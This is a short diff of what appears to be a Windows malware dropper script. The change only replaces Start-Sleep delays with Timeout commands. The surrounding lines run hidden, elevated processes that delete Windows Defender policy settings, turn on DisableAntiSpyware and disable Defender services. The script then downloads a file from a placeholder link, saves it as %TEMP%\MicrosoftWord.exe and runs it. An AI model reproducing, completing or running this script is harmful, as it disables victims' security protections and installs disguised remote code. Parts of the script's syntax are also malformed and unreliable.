@@ -1,4 +1,4 @@
-Start-Sleep -s 300
+Timeout 300 > NUL
 Start-Process -FilePath "$env:comspec" -Verb
 RunAs -WindowStyle hidden- ArgumentList "reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
@@ -42,7 +42,7 @@ reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWOR
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
 cls 
 exit"
-Start-Sleep -s 1800
+Timeout 1800 > NUL
 Start-Process -FilePath "powershell" -Verb
 RunAs -WindowStyle hidden -ArgumentList "$source = "Link"; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
 Start-Process -FilePath %TEMP%\MicrosoftWord.exe"
